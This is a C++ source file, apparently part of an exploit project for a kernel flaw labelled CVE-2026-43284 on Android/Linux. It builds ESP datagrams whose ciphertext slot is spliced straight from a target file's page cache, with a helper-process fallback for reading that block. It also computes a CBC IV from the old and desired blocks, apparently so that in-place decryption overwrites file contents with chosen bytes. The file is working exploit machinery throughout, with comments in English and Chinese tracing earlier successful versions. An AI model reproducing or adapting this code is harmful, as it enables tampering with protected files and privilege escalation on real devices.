/** @file backend/cve_2026_43284/landing/real_splice_io.cpp
 *  The device binding of the splice surface and the concrete system side of the write.
 *
 *  Ported in shape from the old tree's pagecache/splice_io.{hpp,cpp} and the syscall loops of its
 *  pagecache.cpp: a short transfer is retried on the buffer and span writes; -EINTR is retried
 *  without advancing anywhere; the one pipe-to-socket splice retries -EINTR only, because a short
 *  transfer cannot be appended to the same datagram; and every failure before that last splice
 *  closes the pipe without sending -- the same fail-closed rule the write body reports as a block
 *  with no old block.
 *
 *  The wire frame is the buffer the write body assembled, except that the sixteen-byte ciphertext
 *  slot is spliced from the target page: header+vector from memory, page from the file (or from
 *  the bound bridge), check from memory, then the pipe goes to the socket as one datagram.
 *
 *  Android/Linux only for the real calls; any other host gets an all-null surface. No path
 *  allocates.
 */
#include "backend/cve_2026_43284/landing/real_splice_io.hpp"

#include "backend/cve_2026_43284/landing/esp_crypto.hpp"
#include "jni/gl_log.hpp"

#include <cerrno>
#include <cstddef>
#include <cstdint>

#if defined(__linux__)
#include <fcntl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <unistd.h>
#endif

namespace ghostlock::backend::cve_2026_43284::landing {
    namespace {
        /** The in-memory bytes before the ciphertext slot: the header and the vector. */
        constexpr std::size_t kBeforePageBytes = kHeaderBytes + kBlockBytes;
        /** The smallest frame that still leaves the page its slot. */
        constexpr std::size_t kMinDatagramBytes = kBeforePageBytes + kBlockBytes;
        /** The check is at most a SHA-256 digest; the capacity it is written with. */
        constexpr std::size_t kIcvCapacityBytes = 32U;

        /** Writes the whole buffer: short transfers are retried, -EINTR is retried unchanged. */
        [[nodiscard]] bool vmsplice_all(const SpliceIoOps &io, int fd,
                                        const std::uint8_t *data, std::size_t len) noexcept {
            std::size_t done = 0U;
            while (done < len) {
                const std::size_t remaining = len - done;
                const long n = io.vmsplice(fd, data + done, remaining, 0U);
                if (n == -EINTR) continue;
                if (n < 0) return false;
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U || got > remaining) return false;
                done += got;
            }
            return true;
        }

        /** Splices len bytes from in_fd at *offset into out_fd, advancing *offset by what moved. */
        [[nodiscard]] bool splice_span(const SpliceIoOps &io, int in_fd, std::uint64_t *offset,
                                       int out_fd, std::size_t len) noexcept {
            std::size_t done = 0U;
            std::uint64_t cursor = *offset;
            while (done < len) {
                const std::size_t remaining = len - done;
                const long n = io.splice(in_fd, &cursor, out_fd, nullptr, remaining, 0U);
                if (n == -EINTR) continue;
                if (n < 0) return false;
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U || got > remaining) return false;
                done += got;
                cursor += static_cast<std::uint64_t>(got);
            }
            *offset = cursor;
            return true;
        }

        /** The one pipe-to-socket splice: -EINTR is retried, a short transfer is reported as is. */
        [[nodiscard]] long splice_one_datagram(const SpliceIoOps &io, int pipe_fd, int socket_fd,
                                               std::size_t len) noexcept {
            for (;;) {
                const long n = io.splice(pipe_fd, nullptr, socket_fd, nullptr, len, 0U);
                if (n != -EINTR) return n;
            }
        }

        /** Closes what was opened, ownership first, leaving the slots unusable. */
        void close_pair(const SpliceIoOps &io, int fds[2]) noexcept {
            if (fds[0] >= 0) {
                static_cast<void>(io.close_fd(fds[0]));
                fds[0] = -1;
            }
            if (fds[1] >= 0) {
                static_cast<void>(io.close_fd(fds[1]));
                fds[1] = -1;
            }
        }

#if defined(__linux__)
        int real_pipe2(int fds[2], int flags) noexcept {
            return ::pipe2(fds, flags) == 0 ? 0 : -errno;
        }

        long real_splice(int fd_in, const std::uint64_t *off_in, int fd_out,
                         const std::uint64_t *off_out, std::size_t len,
                         unsigned flags) noexcept {
            /* The surface treats the offsets as inputs; splice(2) updates its loff_t values, so
             * the caller's values are copied into locals first. */
            off64_t in_off = 0;
            off64_t out_off = 0;
            off64_t *in_ptr = nullptr;
            off64_t *out_ptr = nullptr;
            if (off_in != nullptr) {
                in_off = static_cast<off64_t>(*off_in);
                in_ptr = &in_off;
            }
            if (off_out != nullptr) {
                out_off = static_cast<off64_t>(*off_out);
                out_ptr = &out_off;
            }
            const ssize_t n = ::splice(fd_in, in_ptr, fd_out, out_ptr, len, flags);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_vmsplice(int fd, const std::uint8_t *data, std::size_t len,
                           unsigned flags) noexcept {
            struct iovec iov {};
            iov.iov_base = const_cast<std::uint8_t *>(data);
            iov.iov_len = len;
            const ssize_t n = ::vmsplice(fd, &iov, 1U, flags);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_send_datagram(int fd, const std::uint8_t *buf, std::size_t len) noexcept {
            struct iovec iov {};
            iov.iov_base = const_cast<std::uint8_t *>(buf);
            iov.iov_len = len;
            struct msghdr msg {};
            msg.msg_iov = &iov;
            msg.msg_iovlen = 1U;
            const ssize_t n = ::sendmsg(fd, &msg, 0);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_read_at(int fd, std::uint8_t *out, std::size_t len,
                          std::uint64_t offset) noexcept {
            const ssize_t n = ::pread(fd, out, len, static_cast<off64_t>(offset));
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        long real_read_pipe(int fd, std::uint8_t *out, std::size_t len) noexcept {
            const ssize_t n = ::read(fd, out, len);
            return n < 0 ? static_cast<long>(-errno) : static_cast<long>(n);
        }

        int real_close_fd(int fd) noexcept {
            return ::close(fd) == 0 ? 0 : -errno;
        }
#endif
    } // namespace

    SpliceIoOps real_splice_io() noexcept {
#if defined(__linux__)
        return SpliceIoOps{&real_pipe2, &real_splice, &real_vmsplice,
                           &real_send_datagram, &real_read_at, &real_read_pipe, &real_close_fd};
#else
        return SpliceIoOps{};
#endif
    }

    long RealSpliceIo::read_at(int fd, std::uint8_t *out, std::size_t size,
                               std::uint64_t offset) noexcept {
        if (out == nullptr || size == 0U) {
            return -EINVAL;
        }
        /* 读的入口（成功历史：pagecache.cpp:116-166 —— 那边先直接 pread，读不满才走注入来源）。 */
        GL_LOGI("splice read_at: fd=%d len=%zu offset=%llu", fd, size,
                static_cast<unsigned long long>(offset));
        long direct = -EBADF;
        if (fd >= 0) {
            std::size_t done = 0U;
            bool failed = false;
            while (done < size) {
                const std::size_t remaining = size - done;
                const long n = io_.read_at(fd, out + done, remaining,
                                           offset + static_cast<std::uint64_t>(done));
                if (n == -EINTR) continue;
                if (n < 0) {
                    direct = n;
                    failed = true;
                    break;
                }
                const std::size_t got = static_cast<std::size_t>(n);
                if (got == 0U) {
                    direct = static_cast<long>(done);
                    failed = true;
                    break;
                }
                if (got > remaining) {
                    direct = -EIO;
                    failed = true;
                    break;
                }
                done += got;
            }
            if (!failed) {
                GL_LOGI("splice read_at: direct ok fd=%d len=%zu offset=%llu", fd, size,
                        static_cast<unsigned long long>(offset));
                return static_cast<long>(size);
            }
        }
        /* The bound source is consulted only when the direct read could not finish, and only for
         * the block it provides; it is all-or-nothing, so the caller checks the count it returns. */
        if (size == kBlockBytes && old_page_.available()) {
            GL_LOGI("splice read_at: bridge fd=%d offset=%llu (direct code=%ld)",
                    fd, static_cast<unsigned long long>(offset), direct);
            return old_page_.read16(old_page_.ctx, offset, out);
        }
        GL_LOGI("splice read_at: direct failed fd=%d len=%zu offset=%llu code=%ld", fd, size,
                static_cast<unsigned long long>(offset), direct);
        return direct;
    }

    long RealSpliceIo::fetch_block(int fd, std::uint8_t *out, std::uint64_t offset) noexcept {
        if (out == nullptr) {
            return -EINVAL;
        }
        if (fd >= 0) {
            /* A descriptor this process can read: the direct read already is the one-call path. */
            return read_at(fd, out, kBlockBytes, offset);
        }
        if (!helper_.available()) {
            /* No helper to run: the older single-read source is all that is left, and it is the
             * same one exec when it is bound. */
            if (old_page_.available()) {
                return old_page_.read16(old_page_.ctx, offset, out);
            }
            return -EBADF;
        }
        if (!io_.available()) {
            return -EIO;
        }
        /*
         * 一次 exec 同时拿到 preimage 与密文页（成功历史：ref@5f184760 pagecache.cpp:158-165 的
         * old_page 回退 + :231 的 helper splice16；那边是 pread 直读所以不付第二次 exec）。
         * helper 的 argv 是 {offset, path}，它把该偏移的 16 字节写到 stdout；把 stdout 接到我们
         * 这条管道，再读回这 16 字节 —— 这 16 字节既是 preimage，也是要进发送管道的密文页。
         */
        int fds[2] = {-1, -1};
        if (io_.pipe2(fds, pipe_flags_) != 0) {
            return -EIO;
        }
        GL_LOGI("fetch_block: offset=%llu pipe=[%d,%d]", static_cast<unsigned long long>(offset),
                fds[0], fds[1]);
        const long spawned = helper_.splice16(helper_.ctx, fds[1], offset);
        /* 我们自己的写端必须先关：helper 写不满时，只读端会一直等一个本进程还开着的管道。 */
        static_cast<void>(io_.close_fd(fds[1]));
        fds[1] = -1;
        long got = 0;
        if (spawned == static_cast<long>(kBlockBytes)) {
            while (got < static_cast<long>(kBlockBytes)) {
                const long n = io_.read_pipe(fds[0], out + got,
                                             kBlockBytes - static_cast<std::size_t>(got));
                if (n == -EINTR) {
                    continue;
                }
                if (n < 0) {
                    got = n;
                    break;
                }
                if (n == 0) {
                    break;
                }
                if (n > static_cast<long>(kBlockBytes) - got) {
                    got = -EIO;
                    break;
                }
                got += n;
            }
        } else {
            got = spawned;
        }
        close_pair(io_, fds);
        /* 短读/失败一律 fail-closed：调用方只有拿到整整 16 字节才会组帧。 */
        if (got != static_cast<long>(kBlockBytes)) {
            GL_LOGI("fetch_block: refused helper=%ld got=%ld offset=%llu",
                    spawned, got, static_cast<unsigned long long>(offset));
            return got;
        }
        GL_LOGI("fetch_block: ok offset=%llu head=%02x%02x%02x%02x",
                static_cast<unsigned long long>(offset), static_cast<unsigned>(out[0]),
                static_cast<unsigned>(out[1]), static_cast<unsigned>(out[2]),
                static_cast<unsigned>(out[3]));
        return static_cast<long>(kBlockBytes);
    }

    bool RealSpliceIo::splice_one(int socket_fd, const std::uint8_t *datagram,
                                  std::size_t size, std::uint64_t offset) noexcept {
        if (datagram == nullptr || socket_fd < 0) {
            last_error_ = 1;
            return false;
        }
        if (!io_.available()) {
            last_error_ = 2;
            return false;
        }
        if (size < kMinDatagramBytes) {
            last_error_ = 3;
            return false; /* Too short to hold the page: refused, not truncated. */
        }
        if (file_fd_ < 0 && !helper_.available()) {
            last_error_ = 4;
            return false; /* No ciphertext source, so there is no datagram. */
        }
        /* 发送的入口（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:208-251
         *  —— 那边 pipe2 后依次 vmsplice(header+iv)、splice(页)、vmsplice(icv)，最后 splice(pipe→socket)；
         *  页与 icv 的长度决定 total，短一字节就是短写）。 */
        GL_LOGI("splice_one: socket=%d size=%zu offset=%llu before_page=%zu page=%zu file_fd=%d helper=%d",
                socket_fd, size, static_cast<unsigned long long>(offset), kBeforePageBytes, kBlockBytes,
                file_fd_, helper_.available() ? 1 : 0);
        int fds[2] = {-1, -1};
        if (io_.pipe2(fds, pipe_flags_) != 0) {
            last_error_ = 10;
            return false;
        }
        GL_LOGI("splice_one: pipe=[%d,%d] flags=0x%x", fds[0], fds[1], static_cast<unsigned>(pipe_flags_));
        bool sent_ok = false;
        for (;;) {
            GL_LOGI("splice_one: segment hdr+vector=%zu -> pipe=%d", kBeforePageBytes, fds[1]);
            if (!vmsplice_all(io_, fds[1], datagram, kBeforePageBytes)) { last_error_ = 20; break; }
            if (file_fd_ >= 0) {
                std::uint64_t cursor = offset;
                GL_LOGI("splice_one: segment page in_fd=%d -> pipe=%d len=%zu at=%llu",
                        file_fd_, fds[1], kBlockBytes, static_cast<unsigned long long>(offset));
                if (!splice_span(io_, file_fd_, &cursor, fds[1], kBlockBytes)) { last_error_ = 21; break; }
                GL_LOGI("splice_one: page spliced=%llu want=%zu cursor=%llu",
                        cursor - offset, kBlockBytes, static_cast<unsigned long long>(cursor));
            } else {
                /* 旧码（本轮替换：不再第二次 fork；旧的探针 read16 也是纯诊断、同样是一次 exec）：
                 * const long spliced = helper_.splice16(helper_.ctx, fds[1], offset);
                 * std::uint8_t probe[16] = {};
                 * const long probed = old_page_.available() ? old_page_.read16(...) : -1;
                 * if (spliced != 16) { last_error_ = 22; break; }
                 * TODO(2026-10-16：fetch_block 的那一次 exec 已把同一份十六字节交回来了，它们就在
                 * 报文的密文槽里；这里只把它们映射进管道，报文与 ICV 覆盖的字节完全一致，且不再
                 * fork。门禁全绿并确认后删除本旧码块)。 */
                GL_LOGI("splice_one: segment page from frame offset=%llu len=%zu -> pipe=%d",
                        static_cast<unsigned long long>(offset), kBlockBytes, fds[1]);
                if (!vmsplice_all(io_, fds[1], datagram + kHeaderBytes + kBlockBytes,
                                  kBlockBytes)) {
                    last_error_ = 22;
                    break;
                }
            }
            const std::size_t suffix = size - kMinDatagramBytes;
            GL_LOGI("splice_one: segment icv=%zu (prefix=%zu)", suffix, kMinDatagramBytes);
            if (!vmsplice_all(io_, fds[1], datagram + kMinDatagramBytes, suffix)) { last_error_ = 23; break; }
            const long sent = splice_one_datagram(io_, fds[0], socket_fd, size);
            GL_LOGI("splice_one: datagram sent=%ld want=%zu pipe=%d socket=%d",
                    sent, size, fds[0], socket_fd);
            if (sent != static_cast<long>(size)) { last_error_ = sent < 0 ? static_cast<int>(sent) : 24; break; }
            sent_ok = true;
            break;
        }
        close_pair(io_, fds);
        /* 结果（成功历史：pagecache.cpp:246-250 —— 那边 sent < 0 或 sent != total 都算失败）。 */
        GL_LOGI("splice_one: done ok=%d last_error=%d (0=no failure, 10=pipe, 20=hdr, 21=page, 22=helper, 23=icv, 24=short)",
                sent_ok ? 1 : 0, sent_ok ? 0 : last_error_);
        return sent_ok;
    }

    void RealSpliceIo::compute_iv(const std::uint8_t old_block[kBlockBytes],
                                  const std::uint8_t desired_block[kBlockBytes],
                                  const std::uint8_t key[32],
                                  std::uint8_t out[kBlockBytes]) noexcept {
        static_cast<void>(esp_cbc_iv(old_block, desired_block, key, out));
    }

    void RealSpliceIo::compute_icv(const std::uint8_t *datagram, std::size_t size,
                                   const std::uint8_t hmac_key[32], std::uint8_t icv_len,
                                   std::uint8_t *out) noexcept {
        static_cast<void>(esp_icv(datagram, size, hmac_key, icv_len, out, kIcvCapacityBytes));
    }
}  // namespace ghostlock::backend::cve_2026_43284::landing
